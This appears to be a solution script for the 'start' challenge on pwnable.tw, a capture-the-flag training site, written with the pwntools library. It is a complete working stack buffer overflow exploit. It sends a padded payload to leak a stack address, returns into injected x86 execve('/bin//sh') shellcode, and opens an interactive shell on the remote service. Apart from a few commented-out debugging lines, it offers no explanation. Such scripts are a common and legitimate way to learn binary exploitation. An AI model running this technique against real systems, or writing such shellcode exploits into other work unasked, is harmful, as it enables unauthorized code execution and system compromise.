from pwn import *
context.log_level="debug"
context.terminal = ['/usr/bin/x-terminal-emulator', '-e']
#p = process('./start')
p = remote('chall.pwnable.tw', 10000)
shellcode=asm( 
    """ xor ecx,ecx;
        xor edx,edx ; 
        push edx;
        push 0x68732f6e;
        push 0x69622f2f; 
        mov ebx,esp;
        mov eax,0xb;
        int 0x80 """
)
payload = b'a'*0x14 + p32(0x08048087)
#gdb.attach(p, 'b * 0x804809c\n')

p.send(payload)
p.recvuntil(b'CTF:')
addr = u32(p.recv(4))+0x14
print(hex(addr))
p.recv()
payload = b'a'*0x14 + p32(addr) + shellcode
p.send(payload)
p.interactive()